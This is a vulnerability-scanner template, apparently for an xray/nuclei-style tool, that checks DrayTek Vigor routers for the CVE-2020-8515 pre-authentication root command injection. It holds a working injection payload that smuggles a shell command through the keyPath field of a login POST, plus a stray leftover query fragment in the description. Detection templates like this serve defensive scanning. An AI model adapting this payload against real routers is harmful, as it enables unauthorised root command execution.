id: CVE-2020-8515

info:
  name: DrayTek pre-auth RCE
  author: Soveless(https://github.com/Soveless)&doinb1517(https://github.com/Double-q1015)
  severity: critical
  description: |
    DrayTek URI未能正确处理SHELL字符，远程攻击者可以利用该漏洞提交特殊的请求，可以ROOT权限执行任意命令。
    远程命令注入漏洞被标记为CVE-2020-8515，主要影响了DrayTek Vigor网络设备，包括企业交换机、路由器、负载均衡器和VPN网关。
    title="Vigor 2960
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8515
    - https://www.exploit-db.com/exploits/48268

set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)

rules:
  r0:
    request:
      method: POST
      path: /cgi-bin/mainfunction.cgi
      body: action=login&keyPath=%27%0Aexpr${IFS}{{r1}}${IFS}-${IFS}{{r2}}%0A%27%&loginUser=a&loginPwd=a
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))

expression: r0()